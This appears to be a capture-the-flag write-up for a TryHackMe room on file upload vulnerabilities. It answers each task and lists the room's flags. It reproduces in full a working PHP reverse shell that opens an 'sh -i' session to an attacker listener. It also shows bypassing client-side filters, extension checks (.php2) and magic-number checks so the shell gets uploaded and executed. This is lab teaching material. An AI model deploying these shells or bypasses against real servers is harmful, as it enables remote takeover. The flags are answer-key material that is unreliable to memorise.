![image](https://github.com/user-attachments/assets/7bb17b22-4c92-4396-878b-46b32062717e)# Upload Vulnerabilities

### Overwriting Existing Files
- What is the name of the image file which can be overwritten?
Navigate to `overwrite.uploadvulns.thm`. Open the page source code: <br />
![image](https://github.com/user-attachments/assets/442b3dce-5883-472f-ab13-cfe70ec3bf9e)<br />
`mountains.jpg`
- Overwrite the image. What is the flag you receive? <br />
Create a file named "mountains.jpg" and upload it to the web server to get the flag: `THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}`

### Remote Code Execution
- Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads? (N.B. This is a good habit to get into, and will serve you well in the upcoming tasks...) <br />
Navigate to `shell.uploadvulns.thm`. To run gobuster, use the following command: `gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt` <br />
![image](https://github.com/user-attachments/assets/ed3fa1c3-56a5-4258-807d-436ca32c700b)<br />
`/resources`
- Get either a web shell or a reverse shell on the machine. What's the flag in the /var/www/ directory of the server? <br />
Go to Revshell.com and copy to get a PHP reverse shell, I will use the one from PentestMonkey: <br />
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.11.85.53';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
<br />
Upload it on the web server, and open a netcat listener on you attack box: `nc -lnvp 4444`. Then go to `http://shell.uploadvulns.thm/resources` and select the uploaded php reverse shell.<br />

![image](https://github.com/user-attachments/assets/4074a7d2-010b-4856-99da-b02f0d6f88a8)

`THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}`

### Filtering
- What is the traditionally predominant server-side scripting language? `PHP`
- When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)? `Whitelist`
- [Research] What MIME type would you expect to see when uploading a CSV file? `text/csv`

### Bypassing Client-Side Filtering
- What is the flag in /var/www/? <br />
If we try to upload the same php shell as before, we get an error: <br />
![image](https://github.com/user-attachments/assets/1c023e3c-a47e-442e-828e-3df653b9544f)
Apparently the web server only allows .png files. But this is just a front-end filter, we can try to rename `revshell.php` to `revshell.php.png`, intercept the request on burpsuite and change the file name again: <br />
![image](https://github.com/user-attachments/assets/a6d2799a-687e-42f0-8479-26c73c15e6b4)
Now again create a reverse shell like before and get the flag at /var/www/flag.txt: `THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}`

### Bypassing Server-Side Filtering: File Extensions
- What is the flag in /var/www/? <br />
Navigate to annex.uploadvulns.thm. The filter is built to only accept .png files. However after some trial and error, I found out that it also accepts .php2 files, if the name contains .png. Therefore I renamed the php reverse shell as `revshell.png.php2` and the upload was successful: <br />
![image](https://github.com/user-attachments/assets/ce6a7a1e-c344-41fd-bc85-976da202115e)
Again, spawn a reverse shell and the the flag: `THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}`

### Bypassing Server-Side Filtering: Magic Numbers
- Grab the flag from /var/www/ <br />
Head to `magic.uploadvulns.thm`. To successfully upload our `revshell.php`, we need to modify the magic number of the file. Search for the [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) for gifs, which is GIF87a. Simply add this string at the beginning of the file. <br />
To check if the hexadecimal value is correct, you can check it by opening the file using `hexeditor`. Now, even the linux `file` command thinks it's a gif: <br />
![image](https://github.com/user-attachments/assets/9b420dfd-6507-49c3-8ac2-24cf985b967a)
beautiful. Now we need a way to find where the files are uploaded. A gobuster search finds us the "graphisc" directory. However we cannot access it. My first trivial try was to try to access the `http://magic.uploadvulns.thm/graphics/revshell.php`  and it worked, lol. If you know any method to find the locations of uploaded files please feel free to let me know, I want to learn! <br />
By accessing the file, the web server executed it and we spawned a reverse shell. The flag is: `THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}`

### Challenge
- Hack the machine and grab the flag from /var/www/ <br />  `THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}`


